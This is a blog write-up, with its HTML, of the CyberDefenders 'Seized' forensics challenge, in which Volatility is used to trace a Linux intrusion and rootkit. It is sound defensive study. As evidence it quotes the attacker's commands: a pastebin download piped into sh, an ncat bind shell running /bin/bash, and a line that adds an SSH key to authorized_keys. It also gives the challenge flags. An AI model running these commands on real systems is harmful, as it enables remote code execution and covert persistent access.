

<!DOCTYPE html>
<html
  lang="fr-fr"
  dir="ltr"
  class="scroll-smooth"
  data-default-appearance="dark"
  data-auto-appearance="false"
><head>
  <meta charset="utf-8" />
  
    <meta http-equiv="content-language" content="fr-fr" />
  
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <meta http-equiv="X-UA-Compatible" content="ie=edge" />
  
  <title>Cyberdefenders · Digital Forensics · Seized &middot; nathan.out</title>
    <meta name="title" content="Cyberdefenders · Digital Forensics · Seized &middot; nathan.out" />
  
  
  
  
  
  <link rel="canonical" href="https://nathan-out.github.io/write-up/cyberdefenders-digital-forensics-seized/" />
  
  
  
  
  
  
  
  
  
    
  
  
  <link
    type="text/css"
    rel="stylesheet"
    href="/css/main.bundle.min.3be096bcd7d4e68dd376b85e8c0157153f5ad62d1d8da3aa541971bdc763082a2357c4f56750b40c029adc50e54e156d1535c7d6a4cfe2f9fe7b128da3507509.css"
    integrity="sha512-O&#43;CWvNfU5o3TdrhejAFXFT9a1i0djaOqVBlxvcdjCCojV8T1Z1C0DAKa3FDlThVtFTXH1qTP4vn&#43;exKNo1B1CQ=="
  />
  
  
  <script type="text/javascript" src="/js/appearance.min.badab316c9287a5a42a843e4eb45da65bb3d194a5a0f5fa4a3e516160e67df0b8c65f4f19a8e146436e29d583699e6cb41d6bbe99e05e1dbaa877763bad9f8e2.js" integrity="sha512-utqzFskoelpCqEPk60XaZbs9GUpaD1&#43;ko&#43;UWFg5n3wuMZfTxmo4UZDbinVg2mebLQda76Z4F4duqh3djutn44g=="></script>
  
    
    
    
  
  
    
    
  
  
  
    
    <script defer type="text/javascript" id="script-bundle" src="/js/main.bundle.min.15ae6e2c9b1ac24a9ccf40003fa689efb1a18db1ee9b73d780b01a6c31b150441415862513e93184f68fe385759e4698b8763cba6a0f79493c1fed99ad5868d4.js" integrity="sha512-Fa5uLJsawkqcz0AAP6aJ77GhjbHum3PXgLAabDGxUEQUFYYlE&#43;kxhPaP44V1nkaYuHY8umoPeUk8H&#43;2ZrVho1A==" data-copy="Copier" data-copied="Copié"></script>
  
  
  
    <link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png" />
    <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png" />
    <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png" />
    <link rel="manifest" href="/site.webmanifest" />
  
  
  
  
  
  
  
  <meta property="og:title" content="Cyberdefenders · Digital Forensics · Seized" />
<meta property="og:description" content="The Scenario:
Using Volatility, utilize your memory analysis skills as a security blue team analyst to Investigate the provided Linux memory snapshots and figure out attack details." />
<meta property="og:type" content="article" />
<meta property="og:url" content="https://nathan-out.github.io/write-up/cyberdefenders-digital-forensics-seized/" /><meta property="article:section" content="write-up" />
<meta property="article:published_time" content="2023-08-02T21:59:01+03:00" />
<meta property="article:modified_time" content="2023-08-02T21:59:01+03:00" /><meta property="og:site_name" content="nathan.out" />

  <meta name="twitter:card" content="summary"/>
<meta name="twitter:title" content="Cyberdefenders · Digital Forensics · Seized"/>
<meta name="twitter:description" content="The Scenario:
Using Volatility, utilize your memory analysis skills as a security blue team analyst to Investigate the provided Linux memory snapshots and figure out attack details."/>

  
  <script type="application/ld+json">
  [{
    "@context": "https://schema.org",
    "@type": "Article",
    "articleSection": "Write-up",
    "name": "Cyberdefenders · Digital Forensics · Seized",
    "headline": "Cyberdefenders · Digital Forensics · Seized",
    
    "abstract": "The Scenario:\nUsing Volatility, utilize your memory analysis skills as a security blue team analyst to Investigate the provided Linux memory snapshots and figure out attack details.",
    "inLanguage": "fr-fr",
    "url" : "https:\/\/nathan-out.github.io\/write-up\/cyberdefenders-digital-forensics-seized\/",
    "author" : {
      "@type": "Person",
      "name": "nathan.out"
    },
    "copyrightYear": "2023",
    "dateCreated": "2023-08-02T21:59:01\u002b03:00",
    "datePublished": "2023-08-02T21:59:01\u002b03:00",
    
    "dateModified": "2023-08-02T21:59:01\u002b03:00",
    
    
    
    "mainEntityOfPage": "true",
    "wordCount": "1146"
  }]
  </script>


  
  <meta name="author" content="nathan.out" />
  
    
      <link href="https://github.com/nathan-out" rel="me" />
    
  
  
  






  
  
  


  
  
</head>
<body
    class="flex flex-col h-screen px-6 m-auto text-lg leading-7 bg-neutral text-neutral-900 sm:px-14 md:px-24 lg:px-32 dark:bg-neutral-800 dark:text-neutral max-w-7xl"
  >
    <div id="the-top" class="absolute flex self-center">
      <a
        class="px-3 py-1 text-sm -translate-y-8 rounded-b-lg bg-primary-200 dark:bg-neutral-600 focus:translate-y-0"
        href="#main-content"
        ><span class="font-bold ltr:pr-2 rtl:pl-2 text-primary-600 dark:text-primary-400"
          >&darr;</span
        >Aller au contenu</a
      >
    </div>
    
    
      <header class="py-6 font-semibold sm:py-10 text-neutral-900 dark:text-neutral print:hidden">
  <nav class="flex justify-between">
    
    <div>
      
        <a
          class="decoration-primary-500 hover:underline hover:decoration-2 hover:underline-offset-2"
          rel="me"
          href="/"
          >nathan.out</a
        >
      

    </div>
    
    
      <ul class="flex flex-col list-none ltr:text-right rtl:text-left sm:flex-row">
        
          
            <li class="mb-1 sm:mb-0 ltr:sm:mr-7 ltr:sm:last:mr-0 rtl:sm:ml-7 rtl:sm:last:ml-0">
              <a
                class="decoration-primary-500 hover:underline hover:decoration-2 hover:underline-offset-2"
                href="/posts/"
                title="Mes articles"
                >Articles</a
              >
            </li>
          
            <li class="mb-1 sm:mb-0 ltr:sm:mr-7 ltr:sm:last:mr-0 rtl:sm:ml-7 rtl:sm:last:ml-0">
              <a
                class="decoration-primary-500 hover:underline hover:decoration-2 hover:underline-offset-2"
                href="/a-propos/"
                title="A Propos"
                >A propos</a
              >
            </li>
          
            <li class="mb-1 sm:mb-0 ltr:sm:mr-7 ltr:sm:last:mr-0 rtl:sm:ml-7 rtl:sm:last:ml-0">
              <a
                class="decoration-primary-500 hover:underline hover:decoration-2 hover:underline-offset-2"
                href="/write-up/"
                title="Write-up"
                >Write-up</a
              >
            </li>
          
        
        
          <li class="ltr:sm:mr-7 ltr:sm:last:mr-0 rtl:sm:ml-7 rtl:sm:last:ml-0">
            <button
              id="search-button"
              class="text-base hover:text-primary-600 dark:hover:text-primary-400"
              title="Rechercher (/)"
            >
              

  <span class="relative inline-block align-text-bottom icon">
    <svg aria-hidden="true" focusable="false" data-prefix="fas" data-icon="search" class="svg-inline--fa fa-search fa-w-16" role="img" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M505 442.7L405.3 343c-4.5-4.5-10.6-7-17-7H372c27.6-35.3 44-79.7 44-128C416 93.1 322.9 0 208 0S0 93.1 0 208s93.1 208 208 208c48.3 0 92.7-16.4 128-44v16.3c0 6.4 2.5 12.5 7 17l99.7 99.7c9.4 9.4 24.6 9.4 33.9 0l28.3-28.3c9.4-9.4 9.4-24.6.1-34zM208 336c-70.7 0-128-57.2-128-128 0-70.7 57.2-128 128-128 70.7 0 128 57.2 128 128 0 70.7-57.2 128-128 128z"/></svg>

  </span>


            </button>
          </li>
        
      </ul>
    
  </nav>
</header>

    
    <div class="relative flex flex-col grow">
      <main id="main-content" class="grow">
        
  <article>
    <header class="max-w-prose">
      
        <ol class="text-sm text-neutral-500 dark:text-neutral-400 print:hidden">
  
  
    
  
    
  
  <li class="inline hidden">
    <a
      class="hover:underline decoration-neutral-300 dark:underline-neutral-600"
      href="/"
      >Blog</a
    ><span class="px-1 text-primary-500">/</span>
  </li>

  
  <li class="inline ">
    <a
      class="hover:underline decoration-neutral-300 dark:underline-neutral-600"
      href="/write-up/"
      >Write-up</a
    ><span class="px-1 text-primary-500">/</span>
  </li>

  
  <li class="inline hidden">
    <a
      class="hover:underline decoration-neutral-300 dark:underline-neutral-600"
      href="/write-up/cyberdefenders-digital-forensics-seized/"
      >Cyberdefenders · Digital Forensics · Seized</a
    ><span class="px-1 text-primary-500">/</span>
  </li>

</ol>


      
      <h1 class="mt-0 text-4xl font-extrabold text-neutral-900 dark:text-neutral">
        Cyberdefenders · Digital Forensics · Seized
      </h1>
      <div class="mt-8 mb-12 text-base text-neutral-500 dark:text-neutral-400 print:hidden">
        





  
  



  

  
  
    
  

  

  

  
    
  

  


  <div class="flex flex-row flex-wrap items-center">
    
    
      <time datetime="2023-08-02 21:59:01 &#43;0300 EEST">2 août 2023</time><span class="px-2 text-primary-500">&middot;</span><span title="Temps de lecture">6 mins</span>
    

    
    
  </div>

  
  


      </div>
    </header>
    <section class="flex flex-col max-w-full mt-0 prose lg:flex-row dark:prose-invert">
      
        <div class="order-first px-0 lg:max-w-xs ltr:lg:pl-8 rtl:lg:pr-8 lg:order-last">
          <div class="ltr:pl-5 rtl:pr-5 toc lg:sticky lg:top-10 print:hidden">
            <details open class="mt-0 overflow-hidden rounded-lg rtl:pr-5 ltr:pl-5 ltr:-ml-5 rtl:-mr-5">
  <summary
    class="block py-1 text-lg font-semibold cursor-pointer rtl:pr-5 ltr:pl-5 ltr:-ml-5 rtl:-mr-5 text-neutral-800 dark:text-neutral-100 lg:hidden bg-neutral-100 dark:bg-neutral-700"
  >
    Sommaire
  </summary>
  <div
    class="py-2 border-dotted ltr:border-l rtl:border-r rtl:pr-5 ltr:pl-5 ltr:-ml-5 rtl:-mr-5 border-neutral-300 dark:border-neutral-600"
  >
    <nav id="TableOfContents">
  <ul>
    <li><a href="#abstract">Abstract</a></li>
    <li><a href="#q1-what-is-the-centos-version-installed-on-the-machine">Q1. What is the CentOS version installed on the machine?</a></li>
    <li><a href="#q2-there-is-a-command-containing-a-strange-message-in-the-bash-history-will-you-be-able-to-read-it">Q2. There is a command containing a strange message in the bash history. Will you be able to read it?</a></li>
    <li><a href="#q3-what-is-the-pid-of-the-suspicious-process">Q3. What is the PID of the suspicious process?</a></li>
    <li><a href="#q4-the-attacker-downloaded-a-backdoor-to-gain-persistence-what-is-the-hidden-message-in-this-backdoor">Q4. The attacker downloaded a backdoor to gain persistence. What is the hidden message in this backdoor?</a></li>
    <li><a href="#q5-what-are-the-attackers-ip-address-and-the-local-port-on-the-targeted-machine">Q5. What are the attacker&rsquo;s IP address and the local port on the targeted machine?</a></li>
    <li><a href="#q6-what-is-the-first-command-that-the-attacker-executed">Q6. What is the first command that the attacker executed?</a></li>
    <li><a href="#q7-after-changing-the-user-password-we-found-that-the-attacker-still-has-access-can-you-find-out-how">Q7. After changing the user password, we found that the attacker still has access. Can you find out how?</a></li>
    <li><a href="#q8-what-is-the-name-of-the-rootkit-that-the-attacker-used">Q8. What is the name of the rootkit that the attacker used?</a></li>
    <li><a href="#q9-the-rootkit-uses-crc65-encryption-what-is-the-key">Q9. The rootkit uses crc65 encryption. What is the key?</a></li>
  </ul>
</nav>
  </div>
</details>

          </div>
        </div>
      
      <div class="min-w-0 min-h-0 max-w-prose">
        <p>The Scenario:</p>
<blockquote>
<p>Using Volatility, utilize your memory analysis skills as a security blue team analyst to Investigate the provided Linux memory snapshots and figure out attack details.</p>
</blockquote>
<p>



  
  
  
    <figure>
      <img class="my-0 rounded-md" src="/img/write-up/cyberdefenders-digital-forensics-seized/syscall.png" alt="Linux syscall illustration." />
      
    </figure>
  

</p>
<figcaption>Linux syscall illustration.</figcaption>
<h2 id="abstract" class="relative group">Abstract <span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style="text-decoration-line: none !important;" href="#abstract" aria-label="Ancre">#</a></span></h2>
<p>The investigation reveals the presence of a suspicious process involving <code>ncat</code> launching scripts, indicating a potential backdoor for gaining persistence. However, despite efforts, the hidden message within the backdoor could not be found, and the attacker&rsquo;s IP address and local port were identified from the network statistics. The first command executed by the attacker involved running Python to spawn <code>/bin/bash</code>.</p>
<p>The article also explores how the attacker maintained access to the compromised machine even after changing the user&rsquo;s password. A thorough analysis of the vim process memory reveals the use of SSH keys for persistence, and the article concludes with the identification of the rootkit used, named <code>sysemptyrect</code>, which employs <code>crc65</code> encryption.</p>
<h2 id="q1-what-is-the-centos-version-installed-on-the-machine" class="relative group">Q1. What is the CentOS version installed on the machine? <span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style="text-decoration-line: none !important;" href="#q1-what-is-the-centos-version-installed-on-the-machine" aria-label="Ancre">#</a></span></h2>
<p>The archive name provides the kernel version, using the <a href="https://en.wikipedia.org/wiki/CentOS">CentOS Wikipedia page</a> you will see that the corresponding CentOS version is <code>7.7-1908</code>.</p>
<h2 id="q2-there-is-a-command-containing-a-strange-message-in-the-bash-history-will-you-be-able-to-read-it" class="relative group">Q2. There is a command containing a strange message in the bash history. Will you be able to read it? <span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style="text-decoration-line: none !important;" href="#q2-there-is-a-command-containing-a-strange-message-in-the-bash-history-will-you-be-able-to-read-it" aria-label="Ancre">#</a></span></h2>
<p>Using <code>linux_bash</code> plugin we could see that the user put content in a file : <code>echo &quot;c2hrQ1RGe2wzdHNfc3Q0cnRfdGgzXzFudjNzdF83NWNjNTU0NzZmM2RmZTE2MjlhYzYwfQo=&quot; &gt; y0ush0uldr34dth1s.txt</code>. Decode the base64 using cyberchef gives the flag.</p>
<h2 id="q3-what-is-the-pid-of-the-suspicious-process" class="relative group">Q3. What is the PID of the suspicious process? <span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style="text-decoration-line: none !important;" href="#q3-what-is-the-pid-of-the-suspicious-process" aria-label="Ancre">#</a></span></h2>
<p><code>linux_pstree</code> shows more than 200 processes. Instead to explore each of them, a clever way is to directly focuse on strange processes using <code>linux_malfind</code> :</p>
<pre tabindex="0"><code class="language-log" data-lang="log">Process: gnome-terminal- Pid: 2535 Address: 0x7f1d414bf000 File: Anonymous Mapping
Protection: VM_READ|VM_WRITE|VM_EXEC
Flags: VM_READ|VM_WRITE|VM_EXEC|VM_MAYREAD|VM_MAYWRITE|VM_MAYEXEC|VM_ACCOUNT|VM_CAN_NONLINEAR

0x007f1d414bf000  78 5f 00 00 00 00 00 00 00 00 00 00 00 00 00 00   x_..............
0x007f1d414bf010  53 41 57 41 56 41 55 55 48 8b df 48 81 ec 50 02   SAWAVAUUH..H..P.
0x007f1d414bf020  00 00 48 8b 43 10 48 83 e8 01 48 8d 74 24 58 48   ..H.C.H...H.t$XH
0x007f1d414bf030  c7 c1 13 00 00 00 48 89 46 08 48 8d 76 08 48 83   ......H.F.H.v.H.
</code></pre><p>Exploring this PID on the <code>pstree</code>, proove that there is something suspicious, as <code>insmod</code> is used to insert modules into the kernel :</p>
<pre tabindex="0"><code class="language-log" data-lang="log">...
.gnome-terminal-     2535            1000
..gnome-pty-helpe    2621            1000
..bash               2622            1000
...sudo              3612
....insmod           3614
...
</code></pre><p><strong>Unfortunately, that&rsquo;s none of them.</strong> Suspicious activity is not always malicious.</p>
<p>Exploring again the <code>pstree</code>, we can see something else suspicious :</p>
<pre tabindex="0"><code class="language-log" data-lang="log">.ncat                2854
..bash               2876
...python            2886
....bash             2887
.....vim             3196
</code></pre><p>This one is more suspicious than the previous one because of the <code>ncat</code> (network process) launching some scripts.</p>
<h2 id="q4-the-attacker-downloaded-a-backdoor-to-gain-persistence-what-is-the-hidden-message-in-this-backdoor" class="relative group">Q4. The attacker downloaded a backdoor to gain persistence. What is the hidden message in this backdoor? <span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style="text-decoration-line: none !important;" href="#q4-the-attacker-downloaded-a-backdoor-to-gain-persistence-what-is-the-hidden-message-in-this-backdoor" aria-label="Ancre">#</a></span></h2>
<p>I was unable to find this answer. I tried to list all the cached files using <code>linux_cached_file</code> to see if there is some suspicious one and dump it, but I found nothing. I tried to dump the suspicious process but without results too.</p>
<p>I also tried the github present in the bash history but I didn&rsquo;t see the hidden line pushed to the right :</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python3" data-lang="python3"><span style="display:flex;"><span>os<span style="color:#f92672">.</span>system(<span style="color:#e6db74">&#39;wget -O - https://pastebin.com/raw/nQwMKjtZ 2&gt;/dev/null|sh&#39;</span>)
</span></span></code></pre></div><p>A write-up gave me the flag because the links seems not valid anymore. This pastebin should contains a base64 strings which is the flag :</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#75715e">### Congratz : c2hrQ1RGe3RoNHRfdzRzXzRfZHVtYl9iNGNrZDAwcl84NjAzM2MxOWUzZjM5MzE1YzAwZGNhfQo=</span>
</span></span><span style="display:flex;"><span>nohup ncat -lvp <span style="color:#ae81ff">12345</span> -4 -e /bin/bash &gt; /dev/null 2&gt;/dev/null &amp;
</span></span></code></pre></div><h2 id="q5-what-are-the-attackers-ip-address-and-the-local-port-on-the-targeted-machine" class="relative group">Q5. What are the attacker&rsquo;s IP address and the local port on the targeted machine? <span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style="text-decoration-line: none !important;" href="#q5-what-are-the-attackers-ip-address-and-the-local-port-on-the-targeted-machine" aria-label="Ancre">#</a></span></h2>
<p>Using <code>linux_netstat</code> returns a lot of information but at the end of the output we could see theses lines :</p>
<pre tabindex="0"><code class="language-log" data-lang="log">TCP      192.168.49.135  :12345 192.168.49.1    :44122 ESTABLISHED                  ncat/2854 
TCP      192.168.49.135  :12345 192.168.49.1    :44122 ESTABLISHED                  bash/2876 
TCP      192.168.49.135  :12345 192.168.49.1    :44122 ESTABLISHED                python/2886 
TCP      192.168.49.135  :12345 192.168.49.1    :44122 ESTABLISHED                  bash/2887 
TCP      192.168.49.135  :12345 192.168.49.1    :44122 ESTABLISHED                   vim/3196 
</code></pre><p>The <strong>local</strong> port is the one written in the script above, and the attacker&rsquo;s IP address is the other.</p>
<h2 id="q6-what-is-the-first-command-that-the-attacker-executed" class="relative group">Q6. What is the first command that the attacker executed? <span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style="text-decoration-line: none !important;" href="#q6-what-is-the-first-command-that-the-attacker-executed" aria-label="Ancre">#</a></span></h2>
<p>We can&rsquo;t see other commands with <code>linux_bash</code>, a different way to investigate on this kind of clues is the <code>linux_psaux</code> plug-in. The output bottom is interesting, as it contains the malware related command line arguments :</p>
<pre tabindex="0"><code class="language-log" data-lang="log">2854   0      0      ncat -lvp 12345 -4 -e /bin/bash
2876   0      0      /bin/bash
2886   0      0      python -c import pty; pty.spawn(&#34;/bin/bash&#34;)
2887   0      0      /bin/bash
3196   0      0      vim /etc/rc.local
3271   0      0      /usr/sbin/abrt-dbus -t133
3279   89     89     cleanup -z -t unix -u
3280   89     89     trivial-rewrite -n rewrite -t unix -u
3281   0      0      local -t unix
3299   0      0      sleep 60
3612   0      0      sudo insmod lime-3.10.0-1062.el7.x86_64.ko path=/Linux64.mem format=lime
3614   0      0      insmod lime-3.10.0-1062.el7.x86_64.ko path=/Linux64.mem format=lime
</code></pre><p>Just after the <code>netcat</code>, the attackers run <code>python -c import pty; pty.spawn(&quot;/bin/bash&quot;)</code>.</p>
<h2 id="q7-after-changing-the-user-password-we-found-that-the-attacker-still-has-access-can-you-find-out-how" class="relative group">Q7. After changing the user password, we found that the attacker still has access. Can you find out how? <span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style="text-decoration-line: none !important;" href="#q7-after-changing-the-user-password-we-found-that-the-attacker-still-has-access-can-you-find-out-how" aria-label="Ancre">#</a></span></h2>
<p>This question is quite hard. First, you have to investigate on the <code>vim</code> process. Why this process?</p>
<ul>
<li>
<p>we didn&rsquo;t care of it yet</p>
</li>
<li>
<p>it&rsquo;s a part of the cyber kill chain</p>
</li>
<li>
<p>intuition I guess?</p>
</li>
</ul>
<p>After dumping the process using <code>linux_dump_map</code>, we could see that the process memory contains lot of information. It contains so much that is difficult to know what to look for. We are looking for malware persistence mecanisms, we can try to ask to ChatGPT what are the most famous persistence mecanism. We can investigate on several answer but the good one is SSH keys. If we search on these files for ssh-things, we will find the answer :</p>
<pre tabindex="0"><code class="language-logs" data-lang="logs">strings *.vma|grep -i &#39;ssh&#39;

#!/bin/sh 
     # Well played : c2hrQ1RGe3JjLmwwYzRsXzFzX2Z1bm55X2JlMjQ3MmNmYWVlZDQ2N2VjOWNhYjViNWEzOGU1ZmEwfQo=
    
    echo &#34;ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCxa8zsyblvEoajgtqciK2XAs1UwNAeV3RcXacqicjzuad2jH7JQdIaqVW4jfEt8h7w+Rei1kZL/xqikGS/AGb2ZLqVSUKWF9afaeE850On4+c1A0wu9n/7N/t2QSnw71BZnvH35+qgENJzFGgFxJEsvZqbawFHD8B426qKFYD+LMAnnFtnrzFj8U+cewG6ODl0Obe8yP/Awv0HYFdhK/IY+t7u2Ywrgp3bXF1l5m+Zk40BqpEYfFzhawYOc/tar1HqaJnYdvqHjwhZeDGYkILvYt4veVc/DjVPX1UjLvlpWv1/AhmLAWgWyUORBwDjM5km0HjN/CY5kWoasXgd1jHD tw0phi@workstation&#34; &gt;&gt; /home/k3vin/.ssh/authorized_keys &amp;&amp; chmod 600 /home/k3vin/.ssh/authorized_keys
    &#34;/etc/rc.local&#34; 3L, 596C
    1,1           
    All zed_keys&gt; /home/k3vin/.ssh/authorized_keys &amp;&amp; 
    chmod 600 /home/k3vin/.ssh/authori
</code></pre><p>The first base64 encoded string is the flag. It&rsquo;s interesting to capitalize on knowledge to understand this persistance mecanism :</p>
<p><strong>This code add a SSH key for the K3vin user and modify its permissions in a manner that only this user can modify it.</strong></p>
<h2 id="q8-what-is-the-name-of-the-rootkit-that-the-attacker-used" class="relative group">Q8. What is the name of the rootkit that the attacker used? <span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style="text-decoration-line: none !important;" href="#q8-what-is-the-name-of-the-rootkit-that-the-attacker-used" aria-label="Ancre">#</a></span></h2>
<p>Thanks to this tutorial, <a href="https://downloads.volatilityfoundation.org/omfw/2012/OMFW2012_Case.pdf">Analyzing Linux Rootkits with Volatility</a>, we learned some ways to detect rootkit on a Linux system. One of them is to investigate on syscalls using <code>linux_check_syscall</code>. This command returns lot of information but we are only interested in the hooked syscalls.</p>
<pre tabindex="0"><code class="language-logs" data-lang="logs">Table Name Index System Call              Handler Address    Symbol                                                      
---------- ----- ------------------------ ------------------ ------------------------------------------------------------
64bit         88                          0xffffffffc0a12470 HOOKED: sysemptyrect/syscall_callback
...
64bit        332                          0x6461625f6e726177 HOOKED: UNKNOWN
</code></pre><p>Firstly, I was quite lost ; how can I find the rootkit name ? In fact, the <code>Symbol</code> column contains the rootkit name here.</p>
<h2 id="q9-the-rootkit-uses-crc65-encryption-what-is-the-key" class="relative group">Q9. The rootkit uses crc65 encryption. What is the key? <span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style="text-decoration-line: none !important;" href="#q9-the-rootkit-uses-crc65-encryption-what-is-the-key" aria-label="Ancre">#</a></span></h2>
<p>Firstly, I searched on internet if this rootkit has a known crc65 encryption key. I found many Write-Up but searching <code>sysemptyrect</code> in the dump file (using <code>grep</code> for example) will give you the key.</p>

      </div>
    </section>
    <footer class="pt-8 max-w-prose print:hidden">
      
  <div class="flex">
    
      
      
        
        <img
          class="w-24 h-24 !mt-0 !mb-0 ltr:mr-4 rtl:ml-4 rounded-full"
          width="96"
          height="96"
          alt="nathan.out"
          src="/img/author_hu00bba01d950a59fc7877b060fc60a3bd_21567_192x192_fill_q75_box_smart1.jpg"
        />
      
    
    <div class="place-self-center">
      
        <div class="text-[0.6rem] leading-3 text-neutral-500 dark:text-neutral-400 uppercase">
          Auteur
        </div>
        <div class="font-semibold leading-6 text-neutral-800 dark:text-neutral-300">
          nathan.out
        </div>
      
      
      <div class="text-2xl sm:text-lg">
  <div class="flex flex-wrap text-neutral-400 dark:text-neutral-500">
    
      
        <a
          class="px-1 hover:text-primary-700 dark:hover:text-primary-400"
          href="https://github.com/nathan-out"
          target="_blank"
          aria-label="Github"
          rel="me noopener noreferrer"
          >

  <span class="relative inline-block align-text-bottom icon">
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 496 512"><path fill="currentColor" d="M165.9 397.4c0 2-2.3 3.6-5.2 3.6-3.3.3-5.6-1.3-5.6-3.6 0-2 2.3-3.6 5.2-3.6 3-.3 5.6 1.3 5.6 3.6zm-31.1-4.5c-.7 2 1.3 4.3 4.3 4.9 2.6 1 5.6 0 6.2-2s-1.3-4.3-4.3-5.2c-2.6-.7-5.5.3-6.2 2.3zm44.2-1.7c-2.9.7-4.9 2.6-4.6 4.9.3 2 2.9 3.3 5.9 2.6 2.9-.7 4.9-2.6 4.6-4.6-.3-1.9-3-3.2-5.9-2.9zM244.8 8C106.1 8 0 113.3 0 252c0 110.9 69.8 205.8 169.5 239.2 12.8 2.3 17.3-5.6 17.3-12.1 0-6.2-.3-40.4-.3-61.4 0 0-70 15-84.7-29.8 0 0-11.4-29.1-27.8-36.6 0 0-22.9-15.7 1.6-15.4 0 0 24.9 2 38.6 25.8 21.9 38.6 58.6 27.5 72.9 20.9 2.3-16 8.8-27.1 16-33.7-55.9-6.2-112.3-14.3-112.3-110.5 0-27.5 7.6-41.3 23.6-58.9-2.6-6.5-11.1-33.3 2.6-67.9 20.9-6.5 69 27 69 27 20-5.6 41.5-8.5 62.8-8.5s42.8 2.9 62.8 8.5c0 0 48.1-33.6 69-27 13.7 34.7 5.2 61.4 2.6 67.9 16 17.7 25.8 31.5 25.8 58.9 0 96.5-58.9 104.2-114.8 110.5 9.2 7.9 17 22.9 17 46.4 0 33.7-.3 75.4-.3 83.6 0 6.5 4.6 14.4 17.3 12.1C428.2 457.8 496 362.9 496 252 496 113.3 383.5 8 244.8 8zM97.2 352.9c-1.3 1-1 3.3.7 5.2 1.6 1.6 3.9 2.3 5.2 1 1.3-1 1-3.3-.7-5.2-1.6-1.6-3.9-2.3-5.2-1zm-10.8-8.1c-.7 1.3.3 2.9 2.3 3.9 1.6 1 3.6.7 4.3-.7.7-1.3-.3-2.9-2.3-3.9-2-.6-3.6-.3-4.3.7zm32.4 35.6c-1.6 1.3-1 4.3 1.3 6.2 2.3 2.3 5.2 2.6 6.5 1 1.3-1.3.7-4.3-1.3-6.2-2.2-2.3-5.2-2.6-6.5-1zm-11.4-14.7c-1.6 1-1.6 3.6 0 5.9 1.6 2.3 4.3 3.3 5.6 2.3 1.6-1.3 1.6-3.9 0-6.2-1.4-2.3-4-3.3-5.6-2z"/></svg>

  </span>

</a
        >
      
    
  </div>

</div>
    </div>
  </div>


      

      
  
    
    
    
    <div class="pt-8">
      <hr class="border-dotted border-neutral-300 dark:border-neutral-600" />
      <div class="flex justify-between pt-3">
        <span>
          
            <a class="flex group" href="/write-up/cyberdefenders-digital-forensics-redline/">
              <span
                class="mr-3 ltr:inline rtl:hidden text-neutral-700 dark:text-neutral group-hover:text-primary-600 dark:group-hover:text-primary-400"
                >&larr;</span
              >
              <span
                class="ml-3 ltr:hidden rtl:inline text-neutral-700 dark:text-neutral group-hover:text-primary-600 dark:group-hover:text-primary-400"
                >&rarr;</span
              >
              <span class="flex flex-col">
                <span
                  class="mt-[0.1rem] leading-6 group-hover:underline group-hover:decoration-primary-500"
                  >Cyberdefenders · Digital Forensics · Redline</span
                >
                <span class="mt-[0.1rem] text-xs text-neutral-500 dark:text-neutral-400">
                  
                    <time datetime="2023-07-22 16:23:52 &#43;0300 EEST">22 juillet 2023</time>
                  
                </span>
              </span>
            </a>
          
        </span>
        <span>
          
        </span>
      </div>
    </div>
  


      
    </footer>
  </article>

        
          <div
            class="absolute top-[100vh] ltr:right-0 rtl:left-0 w-12 pointer-events-none bottom-0"
          >
            <a
              href="#the-top"
              class="w-12 h-12 sticky pointer-events-auto top-[calc(100vh-5.5rem)] bg-neutral/50 dark:bg-neutral-800/50 backdrop-blur rounded-full text-xl flex items-center justify-center text-neutral-700 dark:text-neutral hover:text-primary-600 dark:hover:text-primary-400"
              aria-label="Faire défiler jusqu&#39;au bas de la page"
              title="Faire défiler jusqu&#39;au bas de la page"
            >
              &uarr;
            </a>
          </div>
        
      </main><footer class="py-10 print:hidden">
  
  
  <div class="flex items-center justify-between">
    <div>
      
      
        <p class="text-sm text-neutral-500 dark:text-neutral-400">
            &copy;
            2023
            nathan.out
        </p>
      
      
      
    </div>
    
    
      <div
        class="text-sm cursor-pointer text-neutral-700 dark:text-neutral hover:text-primary-600 dark:hover:text-primary-400 ltr:mr-14 rtl:ml-14"
      >
        <button
          id="appearance-switcher"
          class="w-12 h-12 "
